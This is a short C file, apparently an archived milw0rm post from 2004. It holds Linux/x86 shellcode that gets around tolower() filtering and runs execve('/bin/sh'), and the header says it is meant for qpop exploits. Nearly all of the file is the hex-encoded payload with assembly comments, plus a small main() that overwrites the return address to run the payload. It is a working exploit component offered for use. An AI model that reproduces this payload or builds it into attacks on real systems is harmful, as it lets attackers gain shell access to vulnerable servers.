/*
 *  Linux/x86
 *  tolower() evasion, execve() /bin/sh
 *  (eg use: various qpop exploits)
 */

#include <stdio.h>

char c0de[] =
/* main: */
"\xeb\x1b"                                   /* jmp callz                  */
/* start: */
"\x5e"                                       /* popl %esi                  */
"\x89\xf3"                                   /* movl %esi, %ebx            */
"\x89\xf7"                                   /* movl %esi, %edi            */
"\x83\xc7\x07"                               /* addl $0x07, %edi           */
"\x29\xc0"                                   /* subl %eax, %eax            */
"\xaa"                                       /* stosb %al, %es:(%edi)      */
"\x89\xf9"                                   /* movl %edi, %ecx            */
"\x89\xf0"                                   /* movl %esi, %eax            */
"\xab"                                       /* stosl %eax, %es:(%edi)     */
"\x89\xfa"                                   /* movl %edi, %edx            */
"\x29\xc0"                                   /* subl %eax, %eax            */
"\xab"                                       /* stosl %eax, %es:(%edi)     */
"\xb0\x08"                                   /* movb $0x08, %al            */
"\x04\x03"                                   /* addb $0x03, %al            */
"\xcd\x80"                                   /* int $0x80                  */
/* callz: */
"\xe8\xe0\xff\xff\xff"                       /* call start                 */
/* DATA */
"/bin/sh";

main() {
        int *ret;
        ret=(int *)&ret +2;
        printf("Shellcode lenght=%d\n",strlen(c0de));
        (*ret) = (int)c0de;
}

// milw0rm.com [2004-09-12]